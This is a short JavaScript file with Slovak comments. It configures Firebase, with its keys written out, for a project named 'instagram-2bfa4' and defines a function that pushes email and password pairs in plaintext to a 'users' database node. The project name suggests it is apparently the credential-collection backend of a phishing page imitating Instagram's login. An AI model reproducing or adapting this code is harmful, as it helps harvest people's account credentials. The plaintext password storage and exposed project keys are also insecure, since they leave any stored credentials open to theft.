// Import Firebase SDK
import firebase from 'firebase/app';
import 'firebase/database';

// Konfiguračné informácie pre váš Firebase projekt
const firebaseConfig = {
  apiKey: "AIzaSyAb5xjaKFag0tikpz0GJFjDotOZwKkz_DE",
  authDomain: "instagram-2bfa4.firebaseapp.com",
  databaseURL: "https://instagram-2bfa4-default-rtdb.firebaseio.com",
  projectId: "instagram-2bfa4",
  storageBucket: "instagram-2bfa4.appspot.com",
  messagingSenderId: "540606223972",
  appId: "1:540606223972:web:ce3df05e186435b9c3b171"
};

// Inicializácia Firebase
firebase.initializeApp(firebaseConfig);

// Odkaz na Realtime Database
const database = firebase.database();

// Funkcia pre uloženie prihlasovacích údajov
function saveLoginData(email, password) {
  // Vytvorenie referencie na konkrétnu cestu v databáze, kde budeme ukladať prihlasovacie údaje
  const loginRef = database.ref('users');

  // Uloženie prihlasovacích údajov do databázy
  loginRef.push({
    email: email,
    password: password
  })
    .then(() => {
      console.log('Prihlasovacie údaje boli úspešne uložené.');
    })
    .catch((error) => {
      console.error('Chyba pri ukladaní prihlasovacích údajov:', error);
    });
}

// Volanie funkcie pre uloženie prihlasovacích údajov
saveLoginData('example@email.com', 'password123');
